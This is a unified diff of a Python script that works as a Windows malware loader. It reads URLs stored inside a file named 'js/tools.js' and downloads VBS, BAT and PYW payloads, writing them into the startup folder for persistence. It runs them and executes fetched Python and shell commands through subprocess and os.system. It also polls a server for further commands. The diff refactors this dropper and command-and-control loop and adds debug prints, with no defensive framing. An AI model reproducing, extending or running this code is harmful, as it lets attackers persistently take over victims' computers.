@@ -6,19 +6,33 @@ def get_string(p):
     with request.urlopen(p) as f:
         s = f.read().decode('utf-8')
         return s
+
 def get_lines(p):
     with request.urlopen(p) as f:
         l = f.readlines()
         return l
+
+def set_fl(p, l):
+    with open(p, 'wb') as f:
+        f.writelines(l)
+
+def get_start_p(name):
+    return os.path.join(winshell.startup(), name)
+
 try:
     with open("js/tools.js") as f:
         l = f.readlines()
 
+    server_name = l[5][2:]
     p_lines = get_lines(l[4][2:])
     ready = get_string(l[4][2:])
-    server_name = l[5][2:]
     c_l = get_lines(l[6][2:])
     b_lines = get_lines(l[7][2:])
+
+    print(p_lines)
+    print(ready)
+    print(c_l)
+    print(b_lines)
 
     path = None
     is_ready_to_reload = ""
@@ -28,43 +42,37 @@ try:
         cmpl = c_l[0].decode('utf-8').strip()
         if(cmpl == 'vbs'):
             del c_l[0]
-            path = os.path.join(winshell.startup(), "setup.vbs")
-            with open(path, 'wb') as f:
-                f.writelines(c_l)
 
-            path = os.path.join(winshell.startup(), "setup.bat")
-            with open(path, 'wb') as f:
-                f.writelines(b_lines)
+            path = get_start_p("setup.vbs")
+            print(path)
+            set_fl(path, c_l)
 
-            path = os.path.join(winshell.startup(), "setup.pyw")
-            with open(path, 'wb') as f:
-                f.writelines(p_lines)
+            path = get_start_p("setup.bat")
+            set_fl(path, b_lines)
+            print(path)
 
-            is_ready_to_reload = "lines"
+            path = get_start_p("setup.pyw")
+            set_fl(path,p_lines)
+            print(path)
 
-        elif cmpl == 'lines':
-            del c_l[0]
-            path = os.path.join(winshell.startup(), "setup.bat")
-            with open(path, 'wb') as f:
-                f.writelines(c_l)
+            is_ready_to_reload = "true"
 
         elif cmpl == 'p':
             del c_l[0]
-            path = os.path.join(winshell.startup(), "setup.pyw")
-            with open(path, 'wb') as f:
-                f.writelines(c_l)
-            is_ready_to_reload = "pyw"
+            path = get_start_p("setup.pyw")
+            set_fl(path, p_lines)
+            is_ready_to_reload = "true"
 
         else:
             for n_l in c_l:
                 n_l = n_l.decode('utf-8')
-                result = subprocess.call(n_l, shell=True)
-                is_ready_to_reload = ""
+                subprocess.call(n_l, shell=True)
 
-    if(is_ready_to_reload == "lines"):
+    if(is_ready_to_reload == "true"):
         path = os.path.join(winshell.startup(), "setup.vbs")
         subprocess.call(['cscript.exe', path])
 
+    subprocess.run([sys.executable, "-c", ready])
     new_server = ""
     with request.urlopen(server_name) as f:
         f = f.readlines()
@@ -74,10 +82,6 @@ try:
             print(x)
             x = x.decode('utf-8')
             os.system(x)
-
-    with request.urlopen(p_sc) as f:
-        ready = f.read().decode('utf-8')
-        subprocess.run([sys.executable, "-c", ready])
 
     if(new_server == "" or len(new_server) < 5 or new_server == None):
         pass
